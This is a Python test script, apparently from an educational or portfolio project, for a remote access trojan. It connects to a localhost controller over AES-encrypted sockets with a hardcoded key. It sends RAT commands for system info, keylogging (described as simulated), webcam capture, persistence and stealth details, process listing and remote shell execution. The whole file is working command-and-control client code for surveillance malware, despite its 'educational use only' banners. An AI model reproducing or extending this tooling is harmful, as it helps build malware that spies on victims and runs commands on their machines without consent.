"""
Enhanced RAT Testing Script
Tests advanced features: encryption, keylogger, webcam, persistence, stealth
"""

import socket
import json
import time
import sys
import base64
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import hashlib

HOST = '127.0.0.1'
PORT = 4444
ENCRYPTION_KEY = hashlib.sha256(b"RAT_DEMO_KEY_2025").digest()

def encrypt_data(data):
    """Encrypt data using AES-256-CBC"""
    iv = os.urandom(16)
    cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, iv)
    padded_data = pad(data.encode(), AES.block_size)
    ciphertext = cipher.encrypt(padded_data)
    
    encrypted_package = {
        'iv': base64.b64encode(iv).decode(),
        'ciphertext': base64.b64encode(ciphertext).decode()
    }
    return json.dumps(encrypted_package)

def decrypt_data(encrypted_data):
    """Decrypt data using AES-256-CBC"""
    package = json.loads(encrypted_data)
    iv = base64.b64decode(package['iv'])
    ciphertext = base64.b64decode(package['ciphertext'])
    
    cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, iv)
    decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
    return decrypted_data.decode()

def send_command(sock, command, params=None):
    """Send encrypted command to server"""
    message = {
        'command': command,
        'params': params or {}
    }
    json_data = json.dumps(message)
    encrypted_data = encrypt_data(json_data)
    sock.send((encrypted_data + '\n').encode())
    
    # Receive response
    response = b''
    while True:
        chunk = sock.recv(8192)
        if not chunk:
            break
        response += chunk
        if b'\n' in chunk:
            break
    
    encrypted_response = response.decode().strip()
    decrypted_response = decrypt_data(encrypted_response)
    return json.loads(decrypted_response)

def test_enhanced_features():
    """Test all enhanced RAT features"""
    
    print("=" * 70)
    print("🔐 ENHANCED RAT TESTING SUITE v2.0")
    print("Testing Advanced Features with AES-256 Encryption")
    print("=" * 70)
    print()
    
    try:
        # Connect to server
        print("[1/9] Testing Connection...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((HOST, PORT))
        
        # Receive welcome
        welcome = b''
        while True:
            chunk = sock.recv(8192)
            if not chunk:
                break
            welcome += chunk
            if b'\n' in chunk:
                break
        
        welcome_data = decrypt_data(welcome.decode().strip())
        welcome_msg = json.loads(welcome_data)
        
        if welcome_msg.get('status') == 'connected':
            print("✅ Connection successful with encryption!")
            print(f"   Message: {welcome_msg.get('message')}")
        else:
            print("❌ Connection failed")
            return
        
        time.sleep(1)
        
        # Test 2: Encryption Test (Ping)
        print("\n[2/9] Testing Encrypted Ping...")
        response = send_command(sock, 'ping')
        if response.get('status') == 'success':
            print(f"✅ Encrypted ping successful!")
            print(f"   Response: {response.get('message')}")
        else:
            print("❌ Ping failed")
        
        time.sleep(1)
        
        # Test 3: System Info
        print("\n[3/9] Testing System Info...")
        response = send_command(sock, 'sysinfo')
        if response.get('status') == 'success':
            print("✅ System info retrieved!")
            data = response.get('data', {})
            print(f"   Platform: {data.get('platform')}")
            print(f"   Hostname: {data.get('hostname')}")
        else:
            print("❌ System info failed")
        
        time.sleep(1)
        
        # Test 4: Keylogger (Simulated)
        print("\n[4/9] Testing Keylogger Simulation...")
        response = send_command(sock, 'keylog')
        if response.get('status') == 'success':
            print("✅ Keylogger data retrieved!")
            data = response.get('data', {})
            print(f"   Active: {data.get('active')}")
            print(f"   Buffer Size: {data.get('buffer_size')}")
            print(f"   Sample: {data.get('sample')}")
            print("   ⚠️  Note: This is SIMULATED educational data")
        else:
            print(f"❌ Keylogger failed: {response.get('message')}")
        
        time.sleep(1)
        
        # Test 5: Webcam Capture
        print("\n[5/9] Testing Webcam Capture...")
        response = send_command(sock, 'webcam')
        if response.get('status') == 'success':
            print("✅ Webcam capture successful!")
            image_data = response.get('data')
            print(f"   Image size: {len(image_data)} bytes (base64)")
            # Don't save in test, just verify we got data
        else:
            print(f"⚠️  Webcam: {response.get('message')}")
            print("   (This is expected if no webcam is available)")
        
        time.sleep(1)
        
        # Test 6: Persistence Info
        print("\n[6/9] Testing Persistence Information...")
        response = send_command(sock, 'persistence')
        if response.get('status') == 'success':
            print("✅ Persistence info retrieved!")
            data = response.get('data', {})
            print(f"   Registry methods: {len(data.get('registry', []))}")
            print(f"   Startup methods: {len(data.get('startup', []))}")
            print(f"   Task methods: {len(data.get('scheduled_tasks', []))}")
            print(f"   Service methods: {len(data.get('services', []))}")
        else:
            print(f"❌ Persistence info failed: {response.get('message')}")
        
        time.sleep(1)
        
        # Test 7: Stealth Info
        print("\n[7/9] Testing Stealth Information...")
        response = send_command(sock, 'stealth')
        if response.get('status') == 'success':
            print("✅ Stealth info retrieved!")
            data = response.get('data', {})
            print(f"   Techniques: {len(data.get('techniques', []))}")
            print(f"   Detection methods: {len(data.get('detection_methods', []))}")
            status = data.get('current_status', {})
            print(f"   Process name: {status.get('process_name')}")
            print(f"   Encryption: {status.get('encryption_enabled')}")
        else:
            print(f"❌ Stealth info failed: {response.get('message')}")
        
        time.sleep(1)
        
        # Test 8: Process List
        print("\n[8/9] Testing Process List...")
        response = send_command(sock, 'processlist')
        if response.get('status') == 'success':
            print("✅ Process list retrieved!")
            procs = response.get('data', [])
            print(f"   Total processes: {len(procs)}")
            if procs:
                print(f"   Sample: {procs[0].get('name')} (PID: {procs[0].get('pid')})")
        else:
            print(f"❌ Process list failed: {response.get('message')}")
        
        time.sleep(1)
        
        # Test 9: Shell Command
        print("\n[9/9] Testing Remote Shell...")
        response = send_command(sock, 'shell', {'command': 'echo Enhanced RAT Test'})
        if response.get('status') == 'success':
            print("✅ Shell command executed!")
            print(f"   Output: {response.get('data', '').strip()}")
        else:
            print(f"❌ Shell failed: {response.get('message')}")
        
        # Close connection
        print("\n[*] Closing connection...")
        sock.close()
        
        print("\n" + "=" * 70)
        print("🎉 ENHANCED TESTING COMPLETE!")
        print("=" * 70)
        print("\n📊 TEST SUMMARY:")
        print("   ✅ All 9 advanced features tested")
        print("   🔐 AES-256 encryption working")
        print("   🎯 Educational features verified")
        print("   ⚠️  Remember: FOR EDUCATIONAL USE ONLY!")
        print()
        
    except Exception as e:
        print(f"\n❌ Test failed with error: {e}")
        print("\nMake sure the server is running first!")
        print("Run: py server/server.py")
        return False
    
    return True

if __name__ == "__main__":
    print("\n⚠️  EDUCATIONAL TESTING ONLY ⚠️")
    print("This test suite is for portfolio/demonstration purposes")
    print("Make sure server is running on localhost before testing\n")
    
    input("Press Enter to start testing...")
    
    success = test_enhanced_features()
    
    if success:
        print("\n✅ All tests passed successfully!")
        sys.exit(0)
    else:
        print("\n❌ Some tests failed!")
        sys.exit(1)
